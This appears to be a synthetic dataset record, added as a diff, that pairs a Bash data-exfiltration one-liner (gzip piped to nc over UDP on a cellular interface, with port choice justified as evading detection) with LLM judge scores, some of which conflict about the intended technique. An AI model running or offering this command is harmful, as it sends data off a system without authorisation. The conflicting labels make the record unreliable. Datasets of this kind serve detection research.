@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i wwan0 -nn udp port 56107 -U -w /dev/null >/dev/null 2>&1 & gzip -c /var/tmp/local.db | nc -u -s 10.64.23.5 10.64.23.9 56107",
+  "explanation": "Compresses and exfiltrates data over the cellular interface (wwan0) using UDP on a high port, with tcpdump monitoring only that flow. This is exfiltration over a non-primary medium per T1011.",
+  "rationale_steps": [
+    "Route via cellular (wwan0) to separate from the main enterprise network.",
+    "Pick uncommon UDP port 56107 to lower detection likelihood.",
+    "Monitor narrowly with tcpdump and discard output.",
+    "Pipe compressed data into nc bound to the wwan0 IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-f0489bd2",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags, and correct command separators using both background processing (&) and piping (|).",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over UDP as claimed, it doesn't align with T1011 (Exfiltration Over Other Network Medium) rather than T1485 (Data Destruction) which was the specified technique in the prompt.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:44:16.662479Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid flags, proper command separators, correct redirection, and balanced constructs for both the `tcpdump` and `gzip | nc` parts.",
+        "semantic_score": 0,
+        "semantic_justification": "The command explicitly describes and performs data exfiltration (`gzip -c /var/tmp/local.db | nc ...`), not data destruction, making it entirely misaligned with MITRE ATT&CK T1011.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:44:27.031185Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed single line with valid flags, proper backgrounding, piping, and redirections.",
+        "semantic_score": 4,
+        "semantic_justification": "It compresses and sends /var/tmp/local.db via UDP from the specified source IP (likely the cellular interface) and starts a tcpdump on that port, but tcpdump typically needs elevated privileges and writes to /dev/null so no usable monitoring output is produced and routing depends on the source IP being on wwan0.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T01:45:06.186507Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
